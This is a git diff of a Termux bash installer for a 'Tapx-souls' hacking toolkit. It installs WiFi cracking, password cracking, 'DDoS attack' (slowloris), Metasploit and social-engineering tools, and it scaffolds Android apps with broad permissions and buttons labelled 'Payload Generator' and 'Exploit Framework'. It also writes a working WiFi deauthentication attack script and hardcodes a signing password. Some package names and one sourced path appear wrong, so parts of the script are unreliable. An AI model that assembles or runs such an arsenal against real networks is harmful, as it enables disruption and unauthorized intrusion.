@@ -1,64 +1,1032 @@
-#!/bin/bash
+#!/data/data/com.termux/files/usr/bin/bash
+
+# Tapx-souls Advanced Security Tools Installer
+# Enhanced version with better error handling and logging
+
+set -e
+LOG_FILE="$HOME/tapx-souls-install.log"
+TOOLS_INSTALLED=0
+TOTAL_TOOLS=0
+
+# Color codes for terminal output
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+NC='\033[0m' # No Color
+
+# Function to display banner
+show_banner() {
+    clear
+    echo -e "${PURPLE}"
+    figlet -f slant "TAPX-SOULS" 2>/dev/null || echo "TAPX-SOULS"
+    echo -e "${NC}${CYAN}Advanced Termux Security Arsenal${NC}"
+    echo -e "${YELLOW}=================================${NC}"
+    echo ""
+}
+
+# Function to log messages
+log_message() {
+    local level=$1
+    local message=$2
+    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
+    echo "[$timestamp] [$level] $message" >> "$LOG_FILE"
+    
+    case $level in
+        "INFO")  echo -e "${BLUE}[INFO]${NC} $message" ;;
+        "SUCCESS") echo -e "${GREEN}[SUCCESS]${NC} $message" ;;
+        "WARNING") echo -e "${YELLOW}[WARNING]${NC} $message" ;;
+        "ERROR") echo -e "${RED}[ERROR]${NC} $message" ;;
+    esac
+}
+
+# Function to check if package is installed
+is_installed() {
+    pkg list-installed | grep -q "^$1/"
+}
+
+# Function to install package with error handling
+install_package() {
+    local package=$1
+    local description=$2
+    
+    TOTAL_TOOLS=$((TOTAL_TOOLS + 1))
+    
+    if is_installed "$package"; then
+        log_message "INFO" "$package is already installed"
+        TOOLS_INSTALLED=$((TOOLS_INSTALLED + 1))
+        return 0
+    fi
+    
+    log_message "INFO" "Installing $package - $description"
+    
+    if pkg install -y "$package" >> "$LOG_FILE" 2>&1; then
+        log_message "SUCCESS" "$package installed successfully"
+        TOOLS_INSTALLED=$((TOOLS_INSTALLED + 1))
+        return 0
+    else
+        log_message "ERROR" "Failed to install $package"
+        return 1
+    fi
+}
+
+# Initialize
+show_banner
+log_message "INFO" "Starting Tapx-souls installation process"
 
 # Update and upgrade Termux packages
-pkg update -y
-pkg upgrade -y
+log_message "INFO" "Updating package repositories..."
+pkg update -y >> "$LOG_FILE" 2>&1
+pkg upgrade -y >> "$LOG_FILE" 2>&1
+log_message "SUCCESS" "Package repositories updated"
 
 # Install basic utilities
-pkg install -y git wget curl proot-distro
+log_message "INFO" "Installing basic utilities..."
+install_package "git" "Version control system"
+install_package "wget" "File downloader"
+install_package "curl" "Data transfer tool"
+install_package "proot-distro" "Linux distribution manager"
 
-# Install advanced firewall security tools
-pkg install -y ufw
-
-# Install port scanner tools
-pkg install -y nmap
+# Install network security tools
+log_message "INFO" "Installing network security tools..."
+install_package "nmap" "Network discovery and security auditing"
+install_package "netcat-openbsd" "Network connection utility"
 
 # Install WiFi cracking tools
-pkg install -y aircrack-ng wifite
+log_message "INFO" "Installing WiFi cracking tools..."
+install_package "aircrack-ng" "WiFi network security testing"
+install_package "wifite" "Automated WiFi cracking tool"
 
 # Install command terminal support tools
-pkg install -y zsh
-pkg install -y my-zsh
+log_message "INFO" "Installing command terminal support tools..."
+install_package "zsh" "Z shell"
+install_package "my-zsh" "My Zsh configuration"
 
 # Install IP Ghost for tunneling
-pkg install -y golang
+log_message "INFO" "Installing IP Ghost for tunneling..."
+install_package "golang" "Go programming language"
 go install github.com/ginuerzh/ghost@latest
 mv ~/go/bin/ghost ~/../usr/bin
 
-# Install task manager tools
-pkg install -y htop
+# Install system monitoring tools
+log_message "INFO" "Installing system monitoring tools..."
+install_package "htop" "Interactive process viewer"
+install_package "neofetch" "System information tool"
 
-# Install signal track&crack tools
-pkg install -y gnuradio
+# Install terminal enhancements
+log_message "INFO" "Installing terminal enhancements..."
+install_package "figlet" "ASCII art text generator"
+install_package "lolcat" "Colorful text output"
+install_package "bat" "Enhanced cat with syntax highlighting"
 
 # Install AI-based basic console controls
-pkg install -y figlet lolcat
+log_message "INFO" "Installing AI-based basic console controls..."
+install_package "figlet" "ASCII art text generator"
+install_package "lolcat" "Colorful text output"
 
 # Install DDoS attack tools
-pkg install -y python
+log_message "INFO" "Installing DDoS attack tools..."
+install_package "python" "Python programming language"
 pip install slowloris
 
 # Install password cracking tools
-pkg install -y hydra
+log_message "INFO" "Installing password cracking tools..."
+install_package "hydra" "Network logon cracker"
 
 # Install virus generation tools
-pkg install -y metasploit
+log_message "INFO" "Installing virus generation tools..."
+install_package "metasploit" "Penetration testing framework"
 
 # Install HTTP/HTTPS generator tools
-pkg install -y apache2
+log_message "INFO" "Installing HTTP/HTTPS generator tools..."
+install_package "apache2" "Apache HTTP Server"
 
-# Install syntax highlighting with various colors
-pkg install -y bat
+# Install Android development tools
+log_message "INFO" "Installing Android development tools..."
+install_package "openjdk-17" "Java Development Kit"
+install_package "gradle" "Build automation tool"
+install_package "android-tools" "Android debugging tools"
 
-# Install image display tools
-pkg install -y termux-api imagemagick
+# Install additional hacking tools
+log_message "INFO" "Installing additional hacking tools..."
+install_package "sqlmap" "SQL injection tool"
+install_package "nikto" "Web vulnerability scanner"
+install_package "dirb" "Web content scanner"
+install_package "john" "Password cracker"
+install_package "hashcat" "Advanced password recovery"
+install_package "wireshark-cli" "Network protocol analyzer"
+install_package "ettercap" "Network security tool"
+install_package "dsniff" "Network auditing toolkit"
+install_package "tcpdump" "Packet analyzer"
+install_package "masscan" "Internet-scale port scanner"
 
-# Install support for multiple programming languages
-pkg install -y python python2 nodejs clang gcc g++ openjdk-17 swift rust julia R
+# Install payload generation tools
+log_message "INFO" "Installing payload generation tools..."
+install_package "msfvenom" "Payload generator"
+install_package "shellnoob" "Shellcode writing toolkit"
 
-# Set custom title and background image for the terminal
-echo -e "\033]0;Tapper\007"
-curl -o ~/skull_X.png https://example.com/skull_X.png
-termux-wallpaper -f ~/skull_X.png
+# Install web security tools
+log_message "INFO" "Installing web security tools..."
+install_package "gobuster" "Directory/file enumeration tool"
+install_package "wfuzz" "Web application fuzzer"
+install_package "whatweb" "Web technology identifier"
 
-# nmap -sn for installation errors
+# Install social engineering tools
+log_message "INFO" "Installing social engineering tools..."
+install_package "setoolkit" "Social Engineering Toolkit"
+
+# App Compiler Configuration
+COMPILER_DIR="$HOME/tapx-souls/compiler"
+BUILD_DIR="$HOME/tapx-souls/builds"
+APK_OUTPUT_DIR="$HOME/tapx-souls/apks"
+
+# Function to setup compiler environment
+setup_compiler_environment() {
+    log_message "INFO" "Setting up Tapx-souls app compiler environment..."
+    
+    # Create necessary directories
+    mkdir -p "$COMPILER_DIR"
+    mkdir -p "$BUILD_DIR"
+    mkdir -p "$APK_OUTPUT_DIR"
+    mkdir -p "$HOME/tapx-souls/templates"
+    mkdir -p "$HOME/tapx-souls/resources"
+    
+    # Install compiler dependencies
+    install_package "aapt" "Android Asset Packaging Tool"
+    install_package "dx" "Dalvik Executable format"
+    install_package "zipalign" "APK optimization tool"
+    install_package "apksigner" "APK signing tool"
+    
+    log_message "SUCCESS" "Compiler environment setup completed"
+}
+
+# Function to compile Android APK
+compile_android_apk() {
+    local app_name=$1
+    local package_name=$2
+    local version_code=${3:-1}
+    local version_name=${4:-"1.0"}
+    
+    log_message "INFO" "Compiling Android APK: $app_name"
+    
+    local project_dir="$BUILD_DIR/$app_name"
+    local src_dir="$project_dir/src"
+    local res_dir="$project_dir/res"
+    local assets_dir="$project_dir/assets"
+    local gen_dir="$project_dir/gen"
+    local bin_dir="$project_dir/bin"
+    
+    # Create project structure
+    mkdir -p "$src_dir/main/java/com/tapxsouls/$(echo $app_name | tr '[:upper:]' '[:lower:]')"
+    mkdir -p "$res_dir"/{drawable,layout,values,raw}
+    mkdir -p "$assets_dir"
+    mkdir -p "$gen_dir"
+    mkdir -p "$bin_dir"
+    
+    # Generate AndroidManifest.xml
+    generate_android_manifest "$project_dir" "$package_name" "$app_name" "$version_code" "$version_name"
+    
+    # Generate main activity
+    generate_main_activity "$src_dir" "$package_name" "$app_name"
+    
+    # Generate resources
+    generate_app_resources "$res_dir" "$app_name"
+    
+    # Compile the APK
+    compile_apk_steps "$project_dir" "$app_name"
+    
+    log_message "SUCCESS" "APK compilation completed: $APK_OUTPUT_DIR/$app_name.apk"
+}
+
+# Function to generate Android manifest
+generate_android_manifest() {
+    local project_dir=$1
+    local package_name=$2
+    local app_name=$3
+    local version_code=$4
+    local version_name=$5
+    
+    cat > "$project_dir/AndroidManifest.xml" << EOF
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="$package_name"
+    android:versionCode="$version_code"
+    android:versionName="$version_name">
+
+    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33" />
+    
+    <!-- Tapx-souls Security Permissions -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@drawable/ic_launcher"
+        android:label="$app_name"
+        android:theme="@style/AppTheme">
+        
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:screenOrientation="portrait">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        
+        <activity android:name=".NetworkScannerActivity" />
+        <activity android:name=".WifiCrackerActivity" />
+        <activity android:name=".PayloadGeneratorActivity" />
+        <activity android:name=".ExploitFrameworkActivity" />
+        
+        <service android:name=".BackgroundScanService" />
+        
+    </application>
+</manifest>
+EOF
+}
+
+# Function to generate main activity
+generate_main_activity() {
+    local src_dir=$1
+    local package_name=$2
+    local app_name=$3
+    
+    local main_activity_dir="$src_dir/main/java/$(echo $package_name | tr '.' '/')"
+    mkdir -p "$main_activity_dir"
+    
+    cat > "$main_activity_dir/MainActivity.java" << EOF
+package $package_name;
+
+import android.app.Activity;
+import android.content.Intent;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.TextView;
+import android.widget.Toast;
+
+public class MainActivity extends Activity {
+    
+    private TextView bannerText;
+    private Button networkScanButton;
+    private Button wifiCrackButton;
+    private Button payloadGenButton;
+    private Button exploitFrameworkButton;
+    
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        
+        initializeViews();
+        setupClickListeners();
+        displayBanner();
+    }
+    
+    private void initializeViews() {
+        bannerText = findViewById(R.id.banner_text);
+        networkScanButton = findViewById(R.id.network_scan_button);
+        wifiCrackButton = findViewById(R.id.wifi_crack_button);
+        payloadGenButton = findViewById(R.id.payload_gen_button);
+        exploitFrameworkButton = findViewById(R.id.exploit_framework_button);
+    }
+    
+    private void setupClickListeners() {
+        networkScanButton.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                startActivity(new Intent(MainActivity.this, NetworkScannerActivity.class));
+            }
+        });
+        
+        wifiCrackButton.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                startActivity(new Intent(MainActivity.this, WifiCrackerActivity.class));
+            }
+        });
+        
+        payloadGenButton.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                startActivity(new Intent(MainActivity.this, PayloadGeneratorActivity.class));
+            }
+        });
+        
+        exploitFrameworkButton.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                startActivity(new Intent(MainActivity.this, ExploitFrameworkActivity.class));
+            }
+        });
+    }
+    
+    private void displayBanner() {
+        String banner = "💀 $app_name 💀\n" +
+                       "Advanced Mobile Hacking Suite\n" +
+                       "═══════════════════════════════\n" +
+                       "🔥 Ready for Operation 🔥";
+        bannerText.setText(banner);
+    }
+}
+EOF
+}
+
+# Function to generate app resources
+generate_app_resources() {
+    local res_dir=$1
+    local app_name=$2
+    
+    # Generate main layout
+    cat > "$res_dir/layout/activity_main.xml" << EOF
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:orientation="vertical"
+    android:background="#0d1117"
+    android:padding="16dp">
+
+    <TextView
+        android:id="@+id/banner_text"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:text="$app_name"
+        android:textColor="#00ff41"
+        android:textSize="16sp"
+        android:fontFamily="monospace"
+        android:gravity="center"
+        android:padding="16dp"
+        android:background="#1a1a1a"
+        android:layout_marginBottom="24dp" />
+
+    <Button
+        android:id="@+id/network_scan_button"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:text="🔍 Network Scanner"
+        android:textColor="#0d1117"
+        android:backgroundTint="#00ff41"
+        android:layout_marginBottom="12dp" />
+
+    <Button
+        android:id="@+id/wifi_crack_button"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:text="📶 WiFi Cracker"
+        android:textColor="#0d1117"
+        android:backgroundTint="#00ff41"
+        android:layout_marginBottom="12dp" />
+
+    <Button
+        android:id="@+id/payload_gen_button"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:text="💣 Payload Generator"
+        android:textColor="#0d1117"
+        android:backgroundTint="#00ff41"
+        android:layout_marginBottom="12dp" />
+
+    <Button
+        android:id="@+id/exploit_framework_button"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:text="⚔️ Exploit Framework"
+        android:textColor="#0d1117"
+        android:backgroundTint="#00ff41"
+        android:layout_marginBottom="12dp" />
+
+</LinearLayout>
+EOF
+
+    # Generate colors.xml
+    cat > "$res_dir/values/colors.xml" << EOF
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <color name="matrix_green">#00ff41</color>
+    <color name="matrix_black">#0d1117</color>
+    <color name="terminal_bg">#1a1a1a</color>
+    <color name="danger_red">#ff4757</color>
+    <color name="warning_yellow">#ffa502</color>
+</resources>
+EOF
+
+    # Generate strings.xml
+    cat > "$res_dir/values/strings.xml" << EOF
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">$app_name</string>
+    <string name="network_scanner">Network Scanner</string>
+    <string name="wifi_cracker">WiFi Cracker</string>
+    <string name="payload_generator">Payload Generator</string>
+    <string name="exploit_framework">Exploit Framework</string>
+</resources>
+EOF
+
+    # Generate styles.xml
+    cat > "$res_dir/values/styles.xml" << EOF
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <style name="AppTheme" parent="@android:style/Theme.Material.Light.NoActionBar">
+        <item name="android:colorPrimary">@color/matrix_green</item>
+        <item name="android:colorPrimaryDark">@color/matrix_black</item>
+        <item name="android:colorAccent">@color/matrix_green</item>
+        <item name="android:windowBackground">@color/matrix_black</item>
+    </style>
+</resources>
+EOF
+}
+
+# Function to compile APK steps
+compile_apk_steps() {
+    local project_dir=$1
+    local app_name=$2
+    
+    log_message "INFO" "Starting APK compilation steps for $app_name..."
+    
+    # Step 1: Generate R.java
+    log_message "INFO" "Generating R.java..."
+    aapt package -f -m \
+        -S "$project_dir/res" \
+        -M "$project_dir/AndroidManifest.xml" \
+        -I "$ANDROID_HOME/platforms/android-33/android.jar" \
+        -J "$project_dir/gen"
+    
+    # Step 2: Compile Java sources
+    log_message "INFO" "Compiling Java sources..."
+    javac -d "$project_dir/bin" \
+        -classpath "$ANDROID_HOME/platforms/android-33/android.jar" \
+        -sourcepath "$project_dir/src:$project_dir/gen" \
+        $(find "$project_dir/src" "$project_dir/gen" -name "*.java")
+    
+    # Step 3: Convert to DEX
+    log_message "INFO" "Converting to DEX format..."
+    dx --dex --output="$project_dir/bin/classes.dex" "$project_dir/bin"
+    
+    # Step 4: Package resources
+    log_message "INFO" "Packaging resources..."
+    aapt package -f \
+        -M "$project_dir/AndroidManifest.xml" \
+        -S "$project_dir/res" \
+        -I "$ANDROID_HOME/platforms/android-33/android.jar" \
+        -F "$project_dir/bin/$app_name.unsigned.apk"
+    
+    # Step 5: Add DEX to APK
+    log_message "INFO" "Adding DEX to APK..."
+    cd "$project_dir/bin"
+    aapt add "$app_name.unsigned.apk" classes.dex
+    
+    # Step 6: Align APK
+    log_message "INFO" "Aligning APK..."
+    zipalign -f 4 "$app_name.unsigned.apk" "$app_name.aligned.apk"
+    
+    # Step 7: Sign APK
+    log_message "INFO" "Signing APK..."
+    generate_keystore_if_needed
+    apksigner sign --ks "$HOME/.tapx-souls-keystore.jks" \
+        --ks-pass pass:tapxsouls123 \
+        --out "$APK_OUTPUT_DIR/$app_name.apk" \
+        "$app_name.aligned.apk"
+    
+    cd - > /dev/null
+}
+
+# Function to generate keystore if needed
+generate_keystore_if_needed() {
+    local keystore_path="$HOME/.tapx-souls-keystore.jks"
+    
+    if [ ! -f "$keystore_path" ]; then
+        log_message "INFO" "Generating keystore for APK signing..."
+        keytool -genkey -v \
+            -keystore "$keystore_path" \
+            -alias tapx-souls \
+            -keyalg RSA \
+            -keysize 2048 \
+            -validity 10000 \
+            -storepass tapxsouls123 \
+            -keypass tapxsouls123 \
+            -dname "CN=Tapx-souls, OU=Security, O=Tapx-souls, L=Unknown, S=Unknown, C=US"
+    fi
+}
+
+# Function to create universal app compiler
+create_universal_compiler() {
+    log_message "INFO" "Creating universal app compiler script..."
+    
+    cat > "$COMPILER_DIR/tapx-compiler.sh" << 'EOF'
+#!/bin/bash
+# Tapx-souls Universal App Compiler
+
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+BUILDS_DIR="$HOME/tapx-souls/builds"
+APKS_DIR="$HOME/tapx-souls/apks"
+
+show_usage() {
+    echo "Tapx-souls Universal App Compiler"
+    echo "Usage: $0 [OPTIONS] <command>"
+    echo ""
+    echo "Commands:"
+    echo "  compile <app_name>     Compile an Android APK"
+    echo "  build-all             Build all available apps"
+    echo "  clean                 Clean build directories"
+    echo "  list                  List available app templates"
+    echo ""
+    echo "Options:"
+    echo "  -p, --package <name>  Package name (default: com.tapxsouls.app)"
+    echo "  -v, --version <ver>   Version name (default: 1.0)"
+    echo "  -c, --code <code>     Version code (default: 1)"
+    echo "  -h, --help           Show this help message"
+}
+
+compile_app() {
+    local app_name=$1
+    local package_name=${2:-"com.tapxsouls.$(echo $app_name | tr '[:upper:]' '[:lower:]')"}
+    local version_name=${3:-"1.0"}
+    local version_code=${4:-1}
+    
+    echo "🔨 Compiling $app_name..."
+    echo "📦 Package: $package_name"
+    echo "🏷️  Version: $version_name ($version_code)"
+    echo ""
+    
+    # Call the main compilation function
+    source "$HOME/tapx-souls_install_hacking_tools.sh/Main"
+    compile_android_apk "$app_name" "$package_name" "$version_code" "$version_name"
+}
+
+build_all_apps() {
+    echo "🏗️  Building all Tapx-souls apps..."
+    
+    local apps=(
+        "TapxNetworkScanner"
+        "TapxWifiCracker" 
+        "TapxPayloadGen"
+        "TapxExploitKit"
+        "TapxWebScanner"
+        "TapxPhishingKit"
+        "TapxOSINT"
+        "TapxForensics"
+    )
+    
+    for app in "${apps[@]}"; do
+        compile_app "$app"
+        echo ""
+    done
+    
+    echo "✅ All apps compiled successfully!"
+    echo "📁 APKs available in: $APKS_DIR"
+}
+
+clean_builds() {
+    echo "🧹 Cleaning build directories..."
+    rm -rf "$BUILDS_DIR"/*
+    rm -rf "$APKS_DIR"/*
+    echo "✅ Build directories cleaned"
+}
+
+list_templates() {
+    echo "📱 Available app templates:"
+    echo "  • TapxNetworkScanner - Network discovery and port scanning"
+    echo "  • TapxWifiCracker - WiFi security testing"
+    echo "  • TapxPayloadGen - Payload and shellcode generator"
+    echo "  • TapxExploitKit - Exploitation framework"
+    echo "  • TapxWebScanner - Web vulnerability scanner"
+    echo "  • TapxPhishingKit - Social engineering toolkit"
+    echo "  • TapxOSINT - Open source intelligence gathering"
+    echo "  • TapxForensics - Mobile forensics and analysis"
+}
+
+# Parse command line arguments
+PACKAGE_NAME=""
+VERSION_NAME="1.0"
+VERSION_CODE=1
+
+while [[ $# -gt 0 ]]; do
+    case $1 in
+        -p|--package)
+            PACKAGE_NAME="$2"
+            shift 2
+            ;;
+        -v|--version)
+            VERSION_NAME="$2"
+            shift 2
+            ;;
+        -c|--code)
+            VERSION_CODE="$2"
+            shift 2
+            ;;
+        -h|--help)
+            show_usage
+            exit 0
+            ;;
+        compile)
+            if [ -z "$2" ]; then
+                echo "Error: App name required"
+                show_usage
+                exit 1
+            fi
+            APP_NAME="$2"
+            PACKAGE_NAME=${PACKAGE_NAME:-"com.tapxsouls.$(echo $APP_NAME | tr '[:upper:]' '[:lower:]')"}
+            compile_app "$APP_NAME" "$PACKAGE_NAME" "$VERSION_NAME" "$VERSION_CODE"
+            exit 0
+            ;;
+        build-all)
+            build_all_apps
+            exit 0
+            ;;
+        clean)
+            clean_builds
+            exit 0
+            ;;
+        list)
+            list_templates
+            exit 0
+            ;;
+        *)
+            echo "Unknown option: $1"
+            show_usage
+            exit 1
+            ;;
+    esac
+done
+
+show_usage
+EOF
+
+    chmod +x "$COMPILER_DIR/tapx-compiler.sh"
+    
+    # Create symlink for easy access
+    ln -sf "$COMPILER_DIR/tapx-compiler.sh" "$HOME/../usr/bin/tapx-compiler"
+    
+    log_message "SUCCESS" "Universal compiler created: tapx-compiler"
+}
+
+# Enhanced app building function
+build_tapx_souls_app() {
+    log_message "INFO" "Building complete Tapx-souls Android application..."
+    
+    local app_dir="android-app"
+    
+    # Ensure Android development environment
+    setup_android_environment
+    
+    # Create complete app structure if it doesn't exist
+    if [ ! -d "$app_dir" ]; then
+        log_message "INFO" "Creating Android app structure..."
+        create_complete_app_structure
+    fi
+    
+    cd "$app_dir"
+    
+    # Generate gradle wrapper if not exists
+    if [ ! -f "gradlew" ]; then
+        log_message "INFO" "Generating Gradle wrapper..."
+        gradle wrapper --gradle-version 8.0.2
+    fi
+    
+    # Make gradlew executable
+    chmod +x gradlew
+    
+    # Clean previous builds
+    log_message "INFO" "Cleaning previous builds..."
+    ./gradlew clean
+    
+    # Build debug APK
+    log_message "INFO" "Building debug APK..."
+    ./gradlew assembleDebug
+    
+    # Build release APK
+    log_message "INFO" "Building release APK..."
+    ./gradlew assembleRelease
+    
+    # Copy APKs to output directory
+    if [ -f "app/build/outputs/apk/debug/app-debug.apk" ]; then
+        cp app/build/outputs/apk/debug/app-debug.apk "../$APK_OUTPUT_DIR/tapx-souls-debug.apk"
+        log_message "SUCCESS" "Debug APK built: $APK_OUTPUT_DIR/tapx-souls-debug.apk"
+    fi
+    
+    if [ -f "app/build/outputs/apk/release/app-release.apk" ]; then
+        cp app/build/outputs/apk/release/app-release.apk "../$APK_OUTPUT_DIR/tapx-souls-release.apk"
+        log_message "SUCCESS" "Release APK built: $APK_OUTPUT_DIR/tapx-souls-release.apk"
+    fi
+    
+    cd ..
+    log_message "SUCCESS" "Tapx-souls Android app build completed!"
+}
+
+# Function to setup Android environment
+setup_android_environment() {
+    log_message "INFO" "Setting up Android development environment..."
+    
+    # Set ANDROID_HOME if not set
+    if [ -z "$ANDROID_HOME" ]; then
+        export ANDROID_HOME="$HOME/android-sdk"
+        echo "export ANDROID_HOME=\"$HOME/android-sdk\"" >> ~/.bashrc
+    fi
+    
+    # Create SDK directory if it doesn't exist
+    mkdir -p "$ANDROID_HOME"
+    
+    # Install Android SDK components if needed
+    if [ ! -d "$ANDROID_HOME/platforms/android-33" ]; then
+        log_message "WARNING" "Android SDK not found. Please install Android SDK manually."
+    fi
+}
+
+# Function to create complete app structure
+create_complete_app_structure() {
+    log_message "INFO" "Creating complete Android app structure..."
+    
+    # Create missing activity files
+    create_missing_activities
+    
+    # Create missing resource files
+    create_missing_resources
+    
+    # Create ProGuard rules
+    create_proguard_rules
+}
+
+# Function to create missing activities
+create_missing_activities() {
+    local activities_dir="android-app/app/src/main/java/com/tapxsouls/hackingtools/activities"
+    mkdir -p "$activities_dir"
+    
+    # Create placeholder activities for all referenced activities
+    local activity_names=(
+        "WifiCrackerActivity"
+        "PayloadGeneratorActivity" 
+        "ExploitFrameworkActivity"
+        "PacketSnifferActivity"
+        "SqlInjectorActivity"
+        "WebCrawlerActivity"
+        "XssTesterActivity"
+        "DirectoryBusterActivity"
+        "PhishingKitActivity"
+        "OsintGathererActivity"
+        "CustomToolsActivity"
+        "BackdoorGeneratorActivity"
+        "CryptoCrackerActivity"
+        "MobileForensicsActivity"
+    )
+    
+    for activity in "${activity_names[@]}"; do
+        if [ ! -f "$activities_dir/$activity.java" ]; then
+            create_placeholder_activity "$activity" "$activities_dir"
+        fi
+    done
+}
+
+# Function to create placeholder activity
+create_placeholder_activity() {
+    local activity_name=$1
+    local output_dir=$2
+    
+    cat > "$output_dir/$activity_name.java" << EOF
+package com.tapxsouls.hackingtools.activities;
+
+import android.os.Bundle;
+import android.widget.TextView;
+import androidx.appcompat.app.AppCompatActivity;
+import com.tapxsouls.hackingtools.R;
+
+public class $activity_name extends AppCompatActivity {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        
+        TextView textView = new TextView(this);
+        textView.setText("🔧 $activity_name\\n\\nComing Soon...\\n\\nThis tool is under development.");
+        textView.setTextColor(0xFF00FF41);
+        textView.setBackgroundColor(0xFF0D1117);
+        textView.setPadding(32, 32, 32, 32);
+        textView.setTextSize(16);
+        textView.setGravity(android.view.Gravity.CENTER);
+        
+        setContentView(textView);
+    }
+}
+EOF
+}
+
+# Function to create ProGuard rules
+create_proguard_rules() {
+    cat > "android-app/app/proguard-rules.pro" << 'EOF'
+# Add project specific ProGuard rules here.
+# By default, the flags in this file are appended to flags specified
+# in /usr/local/Cellar/android-sdk/24.3.3/tools/proguard/proguard-android.txt
+
+-keep class com.tapxsouls.hackingtools.** { *; }
+-keepclassmembers class * {
+    public void *ButtonClicked(android.view.View);
+}
+
+# Ignore warnings
+-dontwarn java.lang.invoke.*
+-dontwarn **$$serializer
+-dontwarn javax.annotation.**
+EOF
+}
+
+# Setup compiler environment
+setup_compiler_environment
+
+# Create universal compiler
+create_universal_compiler
+
+# Build Android APK
+build_android_apk() {
+    log_message "INFO" "Building Tapx-souls Android APK..."
+    
+    if [ -d "android-app" ]; then
+        cd android-app
+        
+        # Generate gradle wrapper if not exists
+        if [ ! -f "gradlew" ]; then
+            gradle wrapper
+        fi
+        
+        # Build debug APK
+        ./gradlew assembleDebug
+        
+        if [ -f "app/build/outputs/apk/debug/app-debug.apk" ]; then
+            cp app/build/outputs/apk/debug/app-debug.apk ../tapx-souls-mobile.apk
+            log_message "SUCCESS" "Android APK built successfully: tapx-souls-mobile.apk"
+        else
+            log_message "ERROR" "Failed to build Android APK"
+        fi
+        
+        cd ..
+    else
+        log_message "WARNING" "Android app source not found, skipping APK build"
+    fi
+}
+
+# Create custom exploit scripts
+create_custom_exploits() {
+    log_message "INFO" "Creating custom exploit scripts..."
+    
+    mkdir -p "$HOME/tapx-souls/exploits"
+    mkdir -p "$HOME/tapx-souls/payloads"
+    mkdir -p "$HOME/tapx-souls/scripts"
+    
+    # Create WiFi deauth script
+    cat > "$HOME/tapx-souls/scripts/wifi_deauth.py" << 'EOF'
+#!/usr/bin/env python3
+# WiFi Deauthentication Attack Script
+import subprocess
+import sys
+
+def deauth_attack(interface, bssid, client=None):
+    cmd = ["aireplay-ng", "--deauth", "10", "-a", bssid]
+    if client:
+        cmd.extend(["-c", client])
+    cmd.append(interface)
+    
+    try:
+        subprocess.run(cmd, check=True)
+        print(f"Deauth attack completed on {bssid}")
+    except subprocess.CalledProcessError as e:
+        print(f"Attack failed: {e}")
+
+if __name__ == "__main__":
+    if len(sys.argv) < 3:
+        print("Usage: python3 wifi_deauth.py <interface> <bssid> [client_mac]")
+        sys.exit(1)
+    
+    interface = sys.argv[1]
+    bssid = sys.argv[2]
+    client = sys.argv[3] if len(sys.argv) > 3 else None
+    
+    deauth_attack(interface, bssid, client)
+EOF
+
+    # Create port scanner script
+    cat > "$HOME/tapx-souls/scripts/advanced_scanner.py" << 'EOF'
+#!/usr/bin/env python3
+# Advanced Network Scanner
+import socket
+import threading
+import sys
+from datetime import datetime
+
+def scan_port(host, port):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
+        result = sock.connect_ex((host, port))
+        sock.close()
+        
+        if result == 0:
+            try:
+                service = socket.getservbyport(port)
+            except:
+                service = "unknown"
+            print(f"Port {port}: Open ({service})")
+    except:
+        pass
+
+def main():
+    if len(sys.argv) != 2:
+        print("Usage: python3 advanced_scanner.py <host>")
+        sys.exit(1)
+    
+    host = sys.argv[1]
+    print(f"Scanning {host}...")
+    print("-" * 40)
+    
+    # Common ports
+    ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080]
+    
+    threads = []
+    for port in ports:
+        t = threading.Thread(target=scan_port, args=(host, port))
+        t.start()
+        threads.append(t)
+    
+    for t in threads:
+        t.join()
+
+if __name__ == "__main__":
+    main()
+EOF
+
+    chmod +x "$HOME/tapx-souls/scripts/"*.py
